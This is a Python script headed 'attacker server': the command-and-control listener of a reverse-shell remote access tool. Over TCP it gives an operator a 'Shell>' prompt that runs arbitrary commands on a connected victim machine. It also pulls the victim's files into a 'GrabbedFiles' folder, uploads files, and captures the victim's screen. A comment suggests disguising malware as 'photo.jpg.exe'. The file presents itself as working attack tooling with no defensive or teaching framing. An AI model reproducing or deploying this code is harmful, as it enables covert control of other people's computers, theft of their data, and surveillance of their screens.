# attacker server
#TCP
#Change directory
#TCP bi-directional data transfer

import os
import socket
import hashlib
from datetime import datetime as dt

from common import receiveFile
from common import HashMatchError
from common import sendFile

ip = "0.0.0.0"
destinationPath = os.path.join(os.path.expanduser('~'), 'GrabbedFiles')
from common import port
from common import chunksize
from common import hashAlgorithm

def connect():
    initSocket = socket.socket()
    initSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    initSocket.bind((ip, port))
    initSocket.listen(1)
    print("=" * 60)
    print("TCP DATA INFILTRATION AND EXFILTRATION")
    print("=" * 60)
    print('[+] Listening for incoming TCP mySocketection on port', port)
    mySocket, clientAddress = initSocket.accept()
    print('[+] We got a mySocketection from', clientAddress)

    while True:
        print("=" * 60)
        command = input("Shell> ")
        commandList = command.split()

        if 'terminate' == commandList[0]:
            mySocket.send('terminate'.encode())
            break

        # Command format: grab <File Path>
        # Example: grab C:\Users\user\Desktop\file.txt
        elif 'grab' == commandList[0]:
            try:
                mySocket.send(command.encode())

                remotePath = ' '.join(commandList[1:])
                fileName = os.path.basename(remotePath)
                destinationFile = os.path.join(destinationPath, fileName)

                receiveFile(mySocket, destinationFile)
            except HashMatchError as e:
                print(e)
            except Exception as e:
                print(e)

        # Command format: send <local filepath> <remote filepath>
        # Example: send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
        elif 'send' in commandList[0]:
            localPath = commandList[1]
            mySocket.send(command.encode())
            sendFile(mySocket, localPath)

        elif 'screencap' == commandList[0]:
            mySocket.send(command.encode())
            # just using path here for the name
            path = os.path.join('/NONEXISTANT-SCREENCAP', dt.now().isoformat())
            receiveFile(mySocket, path)

        else:
            mySocket.send(command.encode())
            print(mySocket.recv(chunksize).decode())

def main():
    connect()

main()
